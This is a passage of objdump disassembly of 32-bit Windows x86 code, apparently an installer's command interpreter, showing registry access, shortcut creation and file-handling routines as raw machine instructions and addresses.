  401dfc:	f6 d8                	neg    %al
  401dfe:	1b c0                	sbb    %eax,%eax
  401e00:	53                   	push   %ebx
  401e01:	23 c6                	and    %esi,%eax
  401e03:	50                   	push   %eax
  401e04:	ff 75 cc             	push   -0x34(%ebp)
  401e07:	ff 15 5c 71 40 00    	call   *0x40715c
  401e0d:	83 f8 21             	cmp    $0x21,%eax
  401e10:	0f 8d 75 0a 00 00    	jge    0x40288b
  401e16:	e9 41 08 00 00       	jmp    0x40265c
  401e1b:	53                   	push   %ebx
  401e1c:	e8 d5 0b 00 00       	call   0x4029f6
  401e21:	8b f0                	mov    %eax,%esi
  401e23:	56                   	push   %esi
  401e24:	6a eb                	push   $0xffffffeb
  401e26:	e8 7f 2f 00 00       	call   0x404daa
  401e2b:	56                   	push   %esi
  401e2c:	e8 3b 34 00 00       	call   0x40526c
  401e31:	3b c3                	cmp    %ebx,%eax
  401e33:	89 45 08             	mov    %eax,0x8(%ebp)
  401e36:	0f 84 20 08 00 00    	je     0x40265c
  401e3c:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401e3f:	74 46                	je     0x401e87
  401e41:	8b 35 04 71 40 00    	mov    0x407104,%esi
  401e47:	eb 07                	jmp    0x401e50
  401e49:	6a 0f                	push   $0xf
  401e4b:	e8 17 3f 00 00       	call   0x405d67
  401e50:	6a 64                	push   $0x64
  401e52:	ff 75 08             	push   0x8(%ebp)
  401e55:	ff d6                	call   *%esi
  401e57:	3d 02 01 00 00       	cmp    $0x102,%eax
  401e5c:	74 eb                	je     0x401e49
  401e5e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401e61:	50                   	push   %eax
  401e62:	ff 75 08             	push   0x8(%ebp)
  401e65:	ff 15 08 71 40 00    	call   *0x407108
  401e6b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401e6e:	7c 0b                	jl     0x401e7b
  401e70:	ff 75 f8             	push   -0x8(%ebp)
  401e73:	57                   	push   %edi
  401e74:	e8 f1 3a 00 00       	call   0x40596a
  401e79:	eb 0c                	jmp    0x401e87
  401e7b:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  401e7e:	74 07                	je     0x401e87
  401e80:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401e87:	ff 75 08             	push   0x8(%ebp)
  401e8a:	ff 15 ec 70 40 00    	call   *0x4070ec
  401e90:	e9 f6 09 00 00       	jmp    0x40288b
  401e95:	6a 02                	push   $0x2
  401e97:	e8 5a 0b 00 00       	call   0x4029f6
  401e9c:	50                   	push   %eax
  401e9d:	e8 65 3e 00 00       	call   0x405d07
  401ea2:	3b c3                	cmp    %ebx,%eax
  401ea4:	89 45 08             	mov    %eax,0x8(%ebp)
  401ea7:	74 13                	je     0x401ebc
  401ea9:	8b d8                	mov    %eax,%ebx
  401eab:	ff 73 14             	push   0x14(%ebx)
  401eae:	57                   	push   %edi
  401eaf:	e8 b6 3a 00 00       	call   0x40596a
  401eb4:	ff 73 18             	push   0x18(%ebx)
  401eb7:	e9 a5 f6 ff ff       	jmp    0x401561
  401ebc:	88 1e                	mov    %bl,(%esi)
  401ebe:	88 1f                	mov    %bl,(%edi)
  401ec0:	e9 97 07 00 00       	jmp    0x40265c
  401ec5:	6a ee                	push   $0xffffffee
  401ec7:	e8 2a 0b 00 00       	call   0x4029f6
  401ecc:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401ecf:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401ed2:	51                   	push   %ecx
  401ed3:	50                   	push   %eax
  401ed4:	e8 6d 4d 00 00       	call   0x406c46
  401ed9:	88 1e                	mov    %bl,(%esi)
  401edb:	3b c3                	cmp    %ebx,%eax
  401edd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401ee0:	88 1f                	mov    %bl,(%edi)
  401ee2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401ee9:	0f 84 9c 09 00 00    	je     0x40288b
  401eef:	50                   	push   %eax
  401ef0:	6a 40                	push   $0x40
  401ef2:	ff 15 00 71 40 00    	call   *0x407100
  401ef8:	3b c3                	cmp    %ebx,%eax
  401efa:	89 45 08             	mov    %eax,0x8(%ebp)
  401efd:	0f 84 88 09 00 00    	je     0x40288b
  401f03:	50                   	push   %eax
  401f04:	ff 75 f8             	push   -0x8(%ebp)
  401f07:	53                   	push   %ebx
  401f08:	ff 75 d4             	push   -0x2c(%ebp)
  401f0b:	e8 30 4d 00 00       	call   0x406c40
  401f10:	85 c0                	test   %eax,%eax
  401f12:	74 34                	je     0x401f48
  401f14:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401f17:	50                   	push   %eax
  401f18:	8d 45 cc             	lea    -0x34(%ebp),%eax
  401f1b:	50                   	push   %eax
  401f1c:	68 10 90 40 00       	push   $0x409010
  401f21:	ff 75 08             	push   0x8(%ebp)
  401f24:	e8 11 4d 00 00       	call   0x406c3a
  401f29:	85 c0                	test   %eax,%eax
  401f2b:	74 1b                	je     0x401f48
  401f2d:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401f30:	ff 70 08             	push   0x8(%eax)
  401f33:	56                   	push   %esi
  401f34:	e8 31 3a 00 00       	call   0x40596a
  401f39:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401f3c:	ff 70 0c             	push   0xc(%eax)
  401f3f:	57                   	push   %edi
  401f40:	e8 25 3a 00 00       	call   0x40596a
  401f45:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401f48:	ff 75 08             	push   0x8(%ebp)
  401f4b:	e9 25 fc ff ff       	jmp    0x401b75
  401f50:	39 1d 18 ec 42 00    	cmp    %ebx,0x42ec18
  401f56:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f5d:	0f 8c b6 00 00 00    	jl     0x402019
  401f63:	6a f0                	push   $0xfffffff0
  401f65:	e8 8c 0a 00 00       	call   0x4029f6
  401f6a:	6a 01                	push   $0x1
  401f6c:	8b f0                	mov    %eax,%esi
  401f6e:	e8 83 0a 00 00       	call   0x4029f6
  401f73:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  401f76:	89 45 08             	mov    %eax,0x8(%ebp)
  401f79:	74 0d                	je     0x401f88
  401f7b:	56                   	push   %esi
  401f7c:	ff 15 0c 71 40 00    	call   *0x40710c
  401f82:	8b f8                	mov    %eax,%edi
  401f84:	3b fb                	cmp    %ebx,%edi
  401f86:	75 10                	jne    0x401f98
  401f88:	6a 08                	push   $0x8
  401f8a:	53                   	push   %ebx
  401f8b:	56                   	push   %esi
  401f8c:	ff 15 10 71 40 00    	call   *0x407110
  401f92:	8b f8                	mov    %eax,%edi
  401f94:	3b fb                	cmp    %ebx,%edi
  401f96:	74 7a                	je     0x402012
  401f98:	ff 75 08             	push   0x8(%ebp)
  401f9b:	57                   	push   %edi
  401f9c:	ff 15 14 71 40 00    	call   *0x407114
  401fa2:	8b f0                	mov    %eax,%esi
  401fa4:	3b f3                	cmp    %ebx,%esi
  401fa6:	74 3d                	je     0x401fe5
  401fa8:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401fab:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401fae:	74 17                	je     0x401fc7
  401fb0:	ff 75 e4             	push   -0x1c(%ebp)
  401fb3:	e8 6b f4 ff ff       	call   0x401423
  401fb8:	ff d6                	call   *%esi
  401fba:	85 c0                	test   %eax,%eax
  401fbc:	74 31                	je     0x401fef
  401fbe:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401fc5:	eb 28                	jmp    0x401fef
  401fc7:	68 00 90 40 00       	push   $0x409000
  401fcc:	68 80 af 40 00       	push   $0x40af80
  401fd1:	68 00 f0 42 00       	push   $0x42f000
  401fd6:	68 00 04 00 00       	push   $0x400
  401fdb:	ff 75 cc             	push   -0x34(%ebp)
  401fde:	ff d6                	call   *%esi
  401fe0:	83 c4 14             	add    $0x14,%esp
  401fe3:	eb 0a                	jmp    0x401fef
  401fe5:	ff 75 08             	push   0x8(%ebp)
  401fe8:	6a f7                	push   $0xfffffff7
  401fea:	e8 bb 2d 00 00       	call   0x404daa
  401fef:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401ff2:	0f 85 93 08 00 00    	jne    0x40288b
  401ff8:	57                   	push   %edi
  401ff9:	e8 f7 14 00 00       	call   0x4034f5
  401ffe:	85 c0                	test   %eax,%eax
  402000:	0f 84 85 08 00 00    	je     0x40288b
  402006:	57                   	push   %edi
  402007:	ff 15 18 71 40 00    	call   *0x407118
  40200d:	e9 79 08 00 00       	jmp    0x40288b
  402012:	6a f6                	push   $0xfffffff6
  402014:	e9 4b 01 00 00       	jmp    0x402164
  402019:	6a e7                	push   $0xffffffe7
  40201b:	e9 44 01 00 00       	jmp    0x402164
  402020:	6a f0                	push   $0xfffffff0
  402022:	e8 cf 09 00 00       	call   0x4029f6
  402027:	6a df                	push   $0xffffffdf
  402029:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40202c:	e8 c5 09 00 00       	call   0x4029f6
  402031:	6a 02                	push   $0x2
  402033:	8b f0                	mov    %eax,%esi
  402035:	e8 bc 09 00 00       	call   0x4029f6
  40203a:	6a cd                	push   $0xffffffcd
  40203c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40203f:	e8 b2 09 00 00       	call   0x4029f6
  402044:	6a 45                	push   $0x45
  402046:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402049:	e8 a8 09 00 00       	call   0x4029f6
  40204e:	56                   	push   %esi
  40204f:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402052:	e8 15 35 00 00       	call   0x40556c
  402057:	85 c0                	test   %eax,%eax
  402059:	75 07                	jne    0x402062
  40205b:	6a 21                	push   $0x21
  40205d:	e8 94 09 00 00       	call   0x4029f6
  402062:	8d 45 08             	lea    0x8(%ebp),%eax
  402065:	50                   	push   %eax
  402066:	68 80 74 40 00       	push   $0x407480
  40206b:	6a 01                	push   $0x1
  40206d:	53                   	push   %ebx
  40206e:	68 90 74 40 00       	push   $0x407490
  402073:	ff 15 84 72 40 00    	call   *0x407284
  402079:	3b c3                	cmp    %ebx,%eax
  40207b:	0f 8c da 00 00 00    	jl     0x40215b
  402081:	8b 45 08             	mov    0x8(%ebp),%eax
  402084:	8d 55 cc             	lea    -0x34(%ebp),%edx
  402087:	52                   	push   %edx
  402088:	68 a0 74 40 00       	push   $0x4074a0
  40208d:	8b 08                	mov    (%eax),%ecx
  40208f:	50                   	push   %eax
  402090:	ff 11                	call   *(%ecx)
  402092:	8b f8                	mov    %eax,%edi
  402094:	3b fb                	cmp    %ebx,%edi
  402096:	0f 8c b2 00 00 00    	jl     0x40214e
  40209c:	8b 45 08             	mov    0x8(%ebp),%eax
  40209f:	56                   	push   %esi
  4020a0:	50                   	push   %eax
  4020a1:	8b 08                	mov    (%eax),%ecx
  4020a3:	ff 51 50             	call   *0x50(%ecx)
  4020a6:	8b f8                	mov    %eax,%edi
  4020a8:	8b 45 08             	mov    0x8(%ebp),%eax
  4020ab:	68 00 48 43 00       	push   $0x434800
  4020b0:	50                   	push   %eax
  4020b1:	8b 08                	mov    (%eax),%ecx
  4020b3:	ff 51 24             	call   *0x24(%ecx)
  4020b6:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4020b9:	be ff 00 00 00       	mov    $0xff,%esi
  4020be:	8b c1                	mov    %ecx,%eax
  4020c0:	c1 f8 08             	sar    $0x8,%eax
  4020c3:	23 c6                	and    %esi,%eax
  4020c5:	74 0d                	je     0x4020d4
  4020c7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4020ca:	50                   	push   %eax
  4020cb:	51                   	push   %ecx
  4020cc:	8b 11                	mov    (%ecx),%edx
  4020ce:	ff 52 3c             	call   *0x3c(%edx)
  4020d1:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4020d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4020d7:	c1 f9 10             	sar    $0x10,%ecx
  4020da:	8b 10                	mov    (%eax),%edx
  4020dc:	51                   	push   %ecx
  4020dd:	50                   	push   %eax
  4020de:	ff 52 34             	call   *0x34(%edx)
  4020e1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4020e4:	38 18                	cmp    %bl,(%eax)
  4020e6:	74 12                	je     0x4020fa
  4020e8:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4020eb:	8b 45 08             	mov    0x8(%ebp),%eax
  4020ee:	23 d6                	and    %esi,%edx
  4020f0:	8b 08                	mov    (%eax),%ecx
  4020f2:	52                   	push   %edx
  4020f3:	ff 75 f8             	push   -0x8(%ebp)
  4020f6:	50                   	push   %eax
  4020f7:	ff 51 44             	call   *0x44(%ecx)
  4020fa:	8b 45 08             	mov    0x8(%ebp),%eax
  4020fd:	ff 75 d4             	push   -0x2c(%ebp)
  402100:	8b 08                	mov    (%eax),%ecx
  402102:	50                   	push   %eax
  402103:	ff 51 2c             	call   *0x2c(%ecx)
  402106:	8b 45 08             	mov    0x8(%ebp),%eax
  402109:	ff 75 bc             	push   -0x44(%ebp)
  40210c:	8b 08                	mov    (%eax),%ecx
  40210e:	50                   	push   %eax
  40210f:	ff 51 1c             	call   *0x1c(%ecx)
  402112:	3b fb                	cmp    %ebx,%edi
  402114:	7c 2f                	jl     0x402145
  402116:	be 78 93 40 00       	mov    $0x409378,%esi
  40211b:	68 00 04 00 00       	push   $0x400
  402120:	56                   	push   %esi
  402121:	6a ff                	push   $0xffffffff
  402123:	ff 75 d0             	push   -0x30(%ebp)
  402126:	bf 05 40 00 80       	mov    $0x80004005,%edi
  40212b:	53                   	push   %ebx
  40212c:	53                   	push   %ebx
  40212d:	ff 15 1c 71 40 00    	call   *0x40711c
  402133:	85 c0                	test   %eax,%eax
  402135:	74 0e                	je     0x402145
  402137:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40213a:	6a 01                	push   $0x1
  40213c:	56                   	push   %esi
  40213d:	50                   	push   %eax
  40213e:	8b 08                	mov    (%eax),%ecx
  402140:	ff 51 18             	call   *0x18(%ecx)
  402143:	8b f8                	mov    %eax,%edi
  402145:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402148:	50                   	push   %eax
  402149:	8b 08                	mov    (%eax),%ecx
  40214b:	ff 51 08             	call   *0x8(%ecx)
  40214e:	8b 45 08             	mov    0x8(%ebp),%eax
  402151:	50                   	push   %eax
  402152:	8b 08                	mov    (%eax),%ecx
  402154:	ff 51 08             	call   *0x8(%ecx)
  402157:	3b fb                	cmp    %ebx,%edi
  402159:	7d 13                	jge    0x40216e
  40215b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402162:	6a f0                	push   $0xfffffff0
  402164:	e8 ba f2 ff ff       	call   0x401423
  402169:	e9 1d 07 00 00       	jmp    0x40288b
  40216e:	6a f4                	push   $0xfffffff4
  402170:	eb f2                	jmp    0x402164
  402172:	53                   	push   %ebx
  402173:	e8 7e 08 00 00       	call   0x4029f6
  402178:	6a 11                	push   $0x11
  40217a:	8b f0                	mov    %eax,%esi
  40217c:	e8 75 08 00 00       	call   0x4029f6
  402181:	6a 23                	push   $0x23
  402183:	8b f8                	mov    %eax,%edi
  402185:	e8 6c 08 00 00       	call   0x4029f6
  40218a:	56                   	push   %esi
  40218b:	89 45 08             	mov    %eax,0x8(%ebp)
  40218e:	e8 74 3b 00 00       	call   0x405d07
  402193:	85 c0                	test   %eax,%eax
  402195:	75 0d                	jne    0x4021a4
  402197:	53                   	push   %ebx
  402198:	6a f9                	push   $0xfffffff9
  40219a:	e8 0b 2c 00 00       	call   0x404daa
  40219f:	e9 b8 04 00 00       	jmp    0x40265c
  4021a4:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4021a7:	56                   	push   %esi
  4021a8:	89 45 9c             	mov    %eax,-0x64(%ebp)
  4021ab:	c7 45 a0 02 00 00 00 	movl   $0x2,-0x60(%ebp)
  4021b2:	e8 6b 38 00 00       	call   0x405a22
  4021b7:	57                   	push   %edi
  4021b8:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  4021bc:	e8 61 38 00 00       	call   0x405a22
  4021c1:	88 5c 38 01          	mov    %bl,0x1(%eax,%edi,1)
  4021c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4021c8:	66 8b 4d e4          	mov    -0x1c(%ebp),%cx
  4021cc:	50                   	push   %eax
  4021cd:	53                   	push   %ebx
  4021ce:	89 75 a4             	mov    %esi,-0x5c(%ebp)
  4021d1:	89 7d a8             	mov    %edi,-0x58(%ebp)
  4021d4:	89 45 b6             	mov    %eax,-0x4a(%ebp)
  4021d7:	66 89 4d ac          	mov    %cx,-0x54(%ebp)
  4021db:	e8 ca 2b 00 00       	call   0x404daa
  4021e0:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4021e3:	50                   	push   %eax
  4021e4:	ff 15 60 71 40 00    	call   *0x407160
  4021ea:	85 c0                	test   %eax,%eax
  4021ec:	0f 84 99 06 00 00    	je     0x40288b
  4021f2:	eb a3                	jmp    0x402197
  4021f4:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4021f9:	74 1d                	je     0x402218
  4021fb:	68 10 00 20 00       	push   $0x200010
  402200:	6a e8                	push   $0xffffffe8
  402202:	53                   	push   %ebx
  402203:	e8 26 38 00 00       	call   0x405a2e
  402208:	50                   	push   %eax
  402209:	e8 bf 30 00 00       	call   0x4052cd
  40220e:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  402213:	e9 7e 06 00 00       	jmp    0x402896
  402218:	ff 05 f4 eb 42 00    	incl   0x42ebf4
  40221e:	e9 68 06 00 00       	jmp    0x40288b
  402223:	33 f6                	xor    %esi,%esi
  402225:	33 ff                	xor    %edi,%edi
  402227:	3b c3                	cmp    %ebx,%eax
  402229:	74 0b                	je     0x402236
  40222b:	53                   	push   %ebx
  40222c:	e8 c5 07 00 00       	call   0x4029f6
  402231:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402234:	8b f0                	mov    %eax,%esi
  402236:	3b d3                	cmp    %ebx,%edx
  402238:	74 09                	je     0x402243
  40223a:	6a 11                	push   $0x11
  40223c:	e8 b5 07 00 00       	call   0x4029f6
  402241:	8b f8                	mov    %eax,%edi
  402243:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402246:	74 09                	je     0x402251
  402248:	6a 22                	push   $0x22
  40224a:	e8 a7 07 00 00       	call   0x4029f6
  40224f:	8b d8                	mov    %eax,%ebx
  402251:	6a cd                	push   $0xffffffcd
  402253:	e8 9e 07 00 00       	call   0x4029f6
  402258:	50                   	push   %eax
  402259:	53                   	push   %ebx
  40225a:	57                   	push   %edi
  40225b:	56                   	push   %esi
  40225c:	ff 15 20 71 40 00    	call   *0x407120
  402262:	e9 3f f3 ff ff       	jmp    0x4015a6
  402267:	6a 01                	push   $0x1
  402269:	c7 45 08 21 4e 7e 00 	movl   $0x7e4e21,0x8(%ebp)
  402270:	e8 81 07 00 00       	call   0x4029f6
  402275:	6a 12                	push   $0x12
  402277:	8b f8                	mov    %eax,%edi
  402279:	e8 78 07 00 00       	call   0x4029f6
  40227e:	6a dd                	push   $0xffffffdd
  402280:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402283:	e8 6e 07 00 00       	call   0x4029f6
  402288:	50                   	push   %eax
  402289:	68 ff 03 00 00       	push   $0x3ff
  40228e:	8d 45 08             	lea    0x8(%ebp),%eax
  402291:	56                   	push   %esi
  402292:	50                   	push   %eax
  402293:	ff 75 d0             	push   -0x30(%ebp)
  402296:	57                   	push   %edi
  402297:	ff 15 24 71 40 00    	call   *0x407124
  40229d:	8b 06                	mov    (%esi),%eax
  40229f:	3b 45 08             	cmp    0x8(%ebp),%eax
  4022a2:	e9 6f f4 ff ff       	jmp    0x401716
  4022a7:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4022aa:	75 2b                	jne    0x4022d7
  4022ac:	6a 02                	push   $0x2
  4022ae:	e8 4d 08 00 00       	call   0x402b00
  4022b3:	8b f0                	mov    %eax,%esi
  4022b5:	3b f3                	cmp    %ebx,%esi
  4022b7:	0f 84 9f 03 00 00    	je     0x40265c
  4022bd:	6a 33                	push   $0x33
  4022bf:	e8 32 07 00 00       	call   0x4029f6
  4022c4:	50                   	push   %eax
  4022c5:	56                   	push   %esi
  4022c6:	ff 15 18 70 40 00    	call   *0x407018
  4022cc:	56                   	push   %esi
  4022cd:	8b f8                	mov    %eax,%edi
  4022cf:	ff 15 1c 70 40 00    	call   *0x40701c
  4022d5:	eb 1f                	jmp    0x4022f6
  4022d7:	6a 22                	push   $0x22
  4022d9:	e8 18 07 00 00       	call   0x4029f6
  4022de:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4022e1:	83 e1 02             	and    $0x2,%ecx
  4022e4:	51                   	push   %ecx
  4022e5:	50                   	push   %eax
  4022e6:	ff 75 e0             	push   -0x20(%ebp)
  4022e9:	e8 fd 07 00 00       	call   0x402aeb
  4022ee:	50                   	push   %eax
  4022ef:	e8 42 07 00 00       	call   0x402a36
  4022f4:	8b f8                	mov    %eax,%edi
  4022f6:	3b fb                	cmp    %ebx,%edi
  4022f8:	0f 84 8d 05 00 00    	je     0x40288b
  4022fe:	e9 59 03 00 00       	jmp    0x40265c
  402303:	50                   	push   %eax
  402304:	e8 e2 07 00 00       	call   0x402aeb
  402309:	8b 75 ec             	mov    -0x14(%ebp),%esi
  40230c:	8b f8                	mov    %eax,%edi
  40230e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402311:	6a 02                	push   $0x2
  402313:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402316:	e8 db 06 00 00       	call   0x4029f6
  40231b:	6a 11                	push   $0x11
  40231d:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402320:	e8 d1 06 00 00       	call   0x4029f6
  402325:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402328:	53                   	push   %ebx
  402329:	51                   	push   %ecx
  40232a:	8b 0d 10 ec 42 00    	mov    0x42ec10,%ecx
  402330:	83 c9 02             	or     $0x2,%ecx
  402333:	53                   	push   %ebx
  402334:	51                   	push   %ecx
  402335:	53                   	push   %ebx
  402336:	53                   	push   %ebx
  402337:	53                   	push   %ebx
  402338:	50                   	push   %eax
  402339:	57                   	push   %edi
  40233a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402341:	ff 15 20 70 40 00    	call   *0x407020
  402347:	85 c0                	test   %eax,%eax
  402349:	0f 85 3c 05 00 00    	jne    0x40288b
  40234f:	83 fe 01             	cmp    $0x1,%esi
  402352:	bf 80 a3 40 00       	mov    $0x40a380,%edi
  402357:	75 0e                	jne    0x402367
  402359:	6a 23                	push   $0x23
  40235b:	e8 96 06 00 00       	call   0x4029f6
  402360:	57                   	push   %edi
  402361:	e8 bc 36 00 00       	call   0x405a22
  402366:	40                   	inc    %eax
  402367:	83 fe 04             	cmp    $0x4,%esi
  40236a:	75 0e                	jne    0x40237a
  40236c:	6a 03                	push   $0x3
  40236e:	e8 66 06 00 00       	call   0x4029d9
  402373:	56                   	push   %esi
  402374:	a3 80 a3 40 00       	mov    %eax,0x40a380
  402379:	58                   	pop    %eax
  40237a:	83 fe 03             	cmp    $0x3,%esi
  40237d:	75 0f                	jne    0x40238e
  40237f:	68 00 0c 00 00       	push   $0xc00
  402384:	57                   	push   %edi
  402385:	53                   	push   %ebx
  402386:	ff 75 e8             	push   -0x18(%ebp)
  402389:	e8 cd 0a 00 00       	call   0x402e5b
  40238e:	50                   	push   %eax
  40238f:	57                   	push   %edi
  402390:	ff 75 d0             	push   -0x30(%ebp)
  402393:	53                   	push   %ebx
  402394:	ff 75 bc             	push   -0x44(%ebp)
  402397:	ff 75 08             	push   0x8(%ebp)
  40239a:	ff 15 04 70 40 00    	call   *0x407004
  4023a0:	85 c0                	test   %eax,%eax
  4023a2:	75 03                	jne    0x4023a7
  4023a4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4023a7:	ff 75 08             	push   0x8(%ebp)
  4023aa:	e9 ce 00 00 00       	jmp    0x40247d
  4023af:	68 19 00 02 00       	push   $0x20019
  4023b4:	e8 47 07 00 00       	call   0x402b00
  4023b9:	6a 33                	push   $0x33
  4023bb:	8b f8                	mov    %eax,%edi
  4023bd:	e8 34 06 00 00       	call   0x4029f6
  4023c2:	3b fb                	cmp    %ebx,%edi
  4023c4:	88 1e                	mov    %bl,(%esi)
  4023c6:	0f 84 90 02 00 00    	je     0x40265c
  4023cc:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4023cf:	c7 45 f8 ff 03 00 00 	movl   $0x3ff,-0x8(%ebp)
  4023d6:	51                   	push   %ecx
  4023d7:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4023da:	56                   	push   %esi
  4023db:	51                   	push   %ecx
  4023dc:	53                   	push   %ebx
  4023dd:	50                   	push   %eax
  4023de:	57                   	push   %edi
  4023df:	ff 15 00 70 40 00    	call   *0x407000
  4023e5:	33 c9                	xor    %ecx,%ecx
  4023e7:	41                   	inc    %ecx
  4023e8:	85 c0                	test   %eax,%eax
  4023ea:	75 34                	jne    0x402420
  4023ec:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  4023f0:	74 19                	je     0x40240b
  4023f2:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  4023f5:	74 06                	je     0x4023fd
  4023f7:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4023fb:	75 23                	jne    0x402420
  4023fd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402400:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402403:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402406:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  402409:	eb 71                	jmp    0x40247c
  40240b:	ff 36                	push   (%esi)
  40240d:	33 c0                	xor    %eax,%eax
  40240f:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402412:	56                   	push   %esi
  402413:	0f 94 c0             	sete   %al
  402416:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402419:	e8 4c 35 00 00       	call   0x40596a
  40241e:	eb 5c                	jmp    0x40247c
  402420:	88 1e                	mov    %bl,(%esi)
  402422:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402425:	eb 55                	jmp    0x40247c
  402427:	68 19 00 02 00       	push   $0x20019
  40242c:	e8 cf 06 00 00       	call   0x402b00
  402431:	6a 03                	push   $0x3
  402433:	8b f8                	mov    %eax,%edi
  402435:	e8 9f 05 00 00       	call   0x4029d9
  40243a:	3b fb                	cmp    %ebx,%edi
  40243c:	88 1e                	mov    %bl,(%esi)
  40243e:	0f 84 18 02 00 00    	je     0x40265c
  402444:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402447:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40244c:	89 4d 08             	mov    %ecx,0x8(%ebp)
  40244f:	74 0c                	je     0x40245d
  402451:	51                   	push   %ecx
  402452:	56                   	push   %esi
  402453:	50                   	push   %eax
  402454:	57                   	push   %edi
  402455:	ff 15 08 70 40 00    	call   *0x407008
  40245b:	eb 19                	jmp    0x402476
  40245d:	53                   	push   %ebx
  40245e:	53                   	push   %ebx
  40245f:	53                   	push   %ebx
  402460:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402463:	53                   	push   %ebx
  402464:	51                   	push   %ecx
  402465:	56                   	push   %esi
  402466:	50                   	push   %eax
  402467:	57                   	push   %edi
  402468:	ff 15 0c 70 40 00    	call   *0x40700c
  40246e:	85 c0                	test   %eax,%eax
  402470:	0f 85 e6 01 00 00    	jne    0x40265c
  402476:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  40247c:	57                   	push   %edi
  40247d:	ff 15 1c 70 40 00    	call   *0x40701c
  402483:	e9 03 04 00 00       	jmp    0x40288b
  402488:	38 1e                	cmp    %bl,(%esi)
  40248a:	0f 84 fb 03 00 00    	je     0x40288b
  402490:	56                   	push   %esi
  402491:	e8 ed 34 00 00       	call   0x405983
  402496:	50                   	push   %eax
  402497:	e9 ee f9 ff ff       	jmp    0x401e8a
  40249c:	6a ed                	push   $0xffffffed
  40249e:	e8 53 05 00 00       	call   0x4029f6
  4024a3:	ff 75 e4             	push   -0x1c(%ebp)
  4024a6:	ff 75 e0             	push   -0x20(%ebp)
  4024a9:	50                   	push   %eax
  4024aa:	e8 34 32 00 00       	call   0x4056e3
  4024af:	83 f8 ff             	cmp    $0xffffffff,%eax
  4024b2:	0f 84 a2 01 00 00    	je     0x40265a
  4024b8:	50                   	push   %eax
  4024b9:	e9 a3 f0 ff ff       	jmp    0x401561
  4024be:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4024c1:	74 11                	je     0x4024d4
  4024c3:	6a 01                	push   $0x1
  4024c5:	e8 0f 05 00 00       	call   0x4029d9
  4024ca:	a2 80 9f 40 00       	mov    %al,0x409f80
  4024cf:	33 c0                	xor    %eax,%eax
  4024d1:	40                   	inc    %eax
  4024d2:	eb 0d                	jmp    0x4024e1
  4024d4:	6a 11                	push   $0x11
  4024d6:	e8 1b 05 00 00       	call   0x4029f6
  4024db:	50                   	push   %eax
  4024dc:	e8 41 35 00 00       	call   0x405a22
  4024e1:	38 1e                	cmp    %bl,(%esi)
  4024e3:	0f 84 73 01 00 00    	je     0x40265c
  4024e9:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4024ec:	53                   	push   %ebx
  4024ed:	51                   	push   %ecx
  4024ee:	50                   	push   %eax
  4024ef:	68 80 9f 40 00       	push   $0x409f80
  4024f4:	56                   	push   %esi
  4024f5:	e8 89 34 00 00       	call   0x405983
  4024fa:	50                   	push   %eax
